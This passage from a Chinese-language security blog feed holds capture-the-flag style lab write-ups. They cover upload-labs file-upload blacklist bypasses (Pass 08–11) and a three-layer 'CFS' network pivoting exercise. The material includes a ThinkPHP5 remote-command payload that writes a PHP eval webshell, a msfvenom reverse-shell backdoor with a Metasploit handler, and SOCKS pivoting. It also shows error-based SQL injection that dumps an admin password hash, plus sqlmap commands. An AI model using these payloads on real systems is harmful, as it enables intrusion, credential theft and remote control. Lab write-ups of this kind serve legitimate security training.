class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>相比完整的验证代码，此处少了删除文件名末尾的点的代码。<br>​</p><p>通过burp抓包后在文件后缀后门加上.然后放出数据包完成上传，访问文件为<code>webshell.php.</code><br>![image.png](Upload-labs Pass01-11.assets/pnj2oe.png)</p><h1 id="9-Pass-09-特殊字符-DATA绕过"><a href="#9-Pass-09-特殊字符-DATA绕过" class="headerlink" title="9.Pass-09 特殊字符::$DATA绕过"></a>9.Pass-09 特殊字符::$DATA绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>相比完整的验证代码，少了删除文件后缀中的字符串<code>::$DATA</code><br>补充知识：<br>php在window的时候如果文件名+<code>::$DATA</code> 会把<code>::$DATA </code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code> 之前的文件名。<br>​</p><p>通过burp抓包后在文件后缀后面加上<code>::$DATA</code>，然后放出数据包完成上传，访问文件的地址为<code>webshell.php</code><br>![image.png](Upload-labs Pass01-11.assets/uiuoqu.png)</p><h1 id="10-Pass-10-deldot-函数绕过"><a href="#10-Pass-10-deldot-函数绕过" class="headerlink" title="10.Pass-10 deldot()函数绕过"></a>10.Pass-10 deldot()函数绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来。<br>​</p><p>通过burp抓包后在文件后缀后面加<code>. .</code>，然后放出数据包完成上传,访问文件为<code>webshell.php.</code>![image.png](Upload-labs Pass01-11.assets/d7ruc9.png)</p><h1 id="11-Pass-11-双后缀名绕过—str-ireplace"><a href="#11-Pass-11-双后缀名绕过—str-ireplace" class="headerlink" title="11.Pass-11 双后缀名绕过—str_ireplace()"></a>11.Pass-11 双后缀名绕过—str_ireplace()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br></pre></td></tr></table></figure><p>在代码中使用str_ireplace()函数将<code>deny_ext</code>中存在的黑名单字符串删除，但只是删除一遍，可以通过双写的方式绕过该验证。<br>​</p><p>通过burp抓包后在文件后缀里加入php，然后放出数据包完成上传,访问文件为<code>webshell.php.</code><br>![image.png](Upload-labs Pass01-11.assets/jm4jax.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-Pass-01-前端验证之JS绕过&quot;&gt;&lt;a href=&quot;#1-Pass-01-前端验证之JS绕过&quot; class=&quot;headerlink&quot; title=&quot;1.Pass-01 前端验证之JS绕过&quot;&gt;&lt;/a&gt;1.Pass-01 前端验证之JS绕过&lt;/h1&gt;&lt;figu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CFS三层网络环境</title>
    <link href="http://example.com/2021/12/22/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2021/12/22/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/</id>
    <published>2021-12-22T05:42:44.000Z</published>
    <updated>2022-01-13T08:52:37.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-第一层"><a href="#1-第一层" class="headerlink" title="1.第一层"></a>1.第一层</h1><h2 id="1-1扫描网段内主机"><a href="#1-1扫描网段内主机" class="headerlink" title="1.1扫描网段内主机"></a>1.1扫描网段内主机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap 192.168.2.0/24</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 16:35 CST</span><br><span class="line">Nmap scan report for 192.168.2.168</span><br><span class="line">Host is up (0.026s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">888/tcp  open  accessbuilder</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-2扫描主机开放端口及服务"><a href="#1-2扫描主机开放端口及服务" class="headerlink" title="1.2扫描主机开放端口及服务"></a>1.2扫描主机开放端口及服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV 192.168.2.168</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 16:32 CST</span><br><span class="line">Nmap scan report for 192.168.2.168</span><br><span class="line">Host is up (0.024s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    Ajenti http control panel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-3扫目录"><a href="#1-3扫目录" class="headerlink" title="1.3扫目录"></a>1.3扫目录</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/dirsearch]</span><br><span class="line">└─$ ./dirsearch.py -u http://192.168.2.168/ -e php -r </span><br></pre></td></tr></table></figure><h2 id="1-4进入网站发现为Tinkphp5"><a href="#1-4进入网站发现为Tinkphp5" class="headerlink" title="1.4进入网站发现为Tinkphp5"></a>1.4进入网站发现为Tinkphp5</h2><p><img src="CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83.assets/8pbehw.png" alt="image.png"></p><h3 id="1-4-1验证-gt-ThinkPHP5-x全版本任意命令执行"><a href="#1-4-1验证-gt-ThinkPHP5-x全版本任意命令执行" class="headerlink" title="1.4.1验证-&gt;ThinkPHP5.x全版本任意命令执行"></a>1.4.1验证-&gt;ThinkPHP5.x全版本任意命令执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> payload</span></span><br><span class="line">http://192.168.2.168/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=pwd</span><br></pre></td></tr></table></figure><p><img src="CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83.assets/jagtrf.png" alt="image.png"></p><h3 id="1-4-2验证成功，构造命令写入一句话"><a href="#1-4-2验证成功，构造命令写入一句话" class="headerlink" title="1.4.2验证成功，构造命令写入一句话"></a>1.4.2验证成功，构造命令写入一句话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">写入一句话linux下使用\转义$windows下用^转义  还可以base64加密绕过</span></span><br><span class="line">echo &quot;&lt;?php @eval(\$_POST[fff]);?&gt;&quot; &gt;shell.php</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> payload</span></span><br><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;&lt;?php @eval(\$_POST[fff]);?&gt;&quot; &gt;shell.php</span><br></pre></td></tr></table></figure><h2 id="1-5上线msf"><a href="#1-5上线msf" class="headerlink" title="1.5上线msf"></a>1.5上线msf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.生成后门：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.187 LPORT=1111 -f elf &gt;t1.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">2.接受反弹：</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.187</span><br><span class="line">set LPORT 1111</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">3.上传elf并执行</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ chmod +x t1.elf</span><br><span class="line">(www:/www/wwwroot/ThinkPHP/public) $ ./t1.elf</span><br><span class="line"></span><br><span class="line">4.信息收集及配置访问</span><br><span class="line">获取网络接口：run get_local_subnets</span><br><span class="line">查看路由地址：run autoroute -p</span><br><span class="line">添加路由地址：run autoroute -s 192.168.22.0/24</span><br><span class="line">开启本地代理：</span><br><span class="line">use auxiliary/server/socks_proxy </span><br><span class="line">set srvport 2222</span><br><span class="line">set version 4a </span><br><span class="line">exploit</span><br><span class="line"> </span><br><span class="line">4.利用本地代理接口访问测试</span><br><span class="line">设置浏览器代理进行访问测试</span><br><span class="line">linux：</span><br><span class="line">配置proxychains（代理工具）后调用工具探针Target2</span><br><span class="line">/etc/proxychains.conf</span><br><span class="line">socks4 192.168.2.187 2222（在配置文件中添加）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-第二层"><a href="#2-第二层" class="headerlink" title="2.第二层"></a>2.第二层</h1><h2 id="2-1扫描网段内主机，端口"><a href="#2-1扫描网段内主机，端口" class="headerlink" title="2.1扫描网段内主机，端口"></a>2.1扫描网段内主机，端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 </span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br><span class="line"></span><br><span class="line">proxychains4 nmap -Pn -sT  192.168.22.129</span><br><span class="line">Nmap scan report for 192.168.22.129</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">888/tcp  open  accessbuilder</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br></pre></td></tr></table></figure><h2 id="2-2报错注入-后台-上传后门"><a href="#2-2报错注入-后台-上传后门" class="headerlink" title="2.2报错注入+后台+上传后门"></a>2.2报错注入+后台+上传后门</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">利用代理工具Proxifier或SocksCap64载入代理进行进程访问测试</span><br><span class="line"> </span><br><span class="line">Target2（ubuntu x64）：</span><br><span class="line">探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-Target3</span><br><span class="line">http://192.168.22.128/index.php?r=vul&amp;keyword=1 #sql注入</span><br><span class="line">http://192.168.22.128/index.php?r=admini/public/login #后台</span><br></pre></td></tr></table></figure><h2 id="2-3sql注入"><a href="#2-3sql注入" class="headerlink" title="2.3sql注入"></a>2.3sql注入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sql手工注入</span></span><br><span class="line">1.报错----》存在注入</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> CDbCommand 无法执行 SQL 语句: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;&#x27;</span>1<span class="string">&#x27;&#x27;</span><span class="string">&#x27; at line 1</span></span></span><br><span class="line"></span><br><span class="line">2.显示当前库</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and info() --+</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION bagecms.info does not exist</span></span></span><br><span class="line"></span><br><span class="line">3.报错注入获取铭感信息</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) --+</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~bagecms@localhost~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">4.得到表名</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)) --+</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~bage_admin~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">5.获取列名</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;bage_admin&#x27; limit 1,1),0x7e),1)) --+    </span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~username~<span class="string">&#x27;</span></span>   </span><br><span class="line"></span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;bage_admin&#x27; limit 2,1),0x7e),1)) --+    </span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~password~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">6.获取用户名，密码</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select concat_ws(&#x27;:&#x27;, username, password) from bage_admin limit 0,1),0x7e),1)) --+  </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~admin:46f94c8de14fb36680850768f<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">7.由于密码位数太长，需要截取获取后面的数据</span><br><span class="line">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#x27; and (updatexml(1,concat(0x7e,(select concat_ws(&#x27;:&#x27;,substring_index(password,&#x27;f&#x27;,-4)) from bage_admin limit 0,1),0x7e),1)) --+  </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> CDbCommand 无法执行 SQL 语句: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: &#x27;</span>~b36680850768ff1b7f2a~<span class="string">&#x27;</span></span></span><br><span class="line"></span><br><span class="line">用户名：密码</span><br><span class="line">admin:46f94c8de14fb36680850768ff1b7f2a</span><br><span class="line">密码解密得：123qwe</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> sqlmap注入</span></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --current-user --current-db --is-dba --passwords --batch</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch --dbs</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;http://192.168.22.128/index.php?r=vul&amp;keyword=1&quot; --batch -D bagecms --tables</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span 